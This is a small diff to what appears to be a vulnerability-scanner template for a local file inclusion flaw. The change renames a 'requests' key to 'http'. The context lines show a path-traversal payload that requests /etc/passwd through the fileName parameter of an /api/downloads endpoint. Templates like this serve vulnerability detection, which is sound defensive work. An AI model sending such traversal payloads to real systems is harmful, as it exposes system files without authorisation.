@@ -8,7 +8,7 @@ info:
   reference: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5657.php
   tags: lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/api/downloads?fileName=../../../../../../../../etc/passwd"
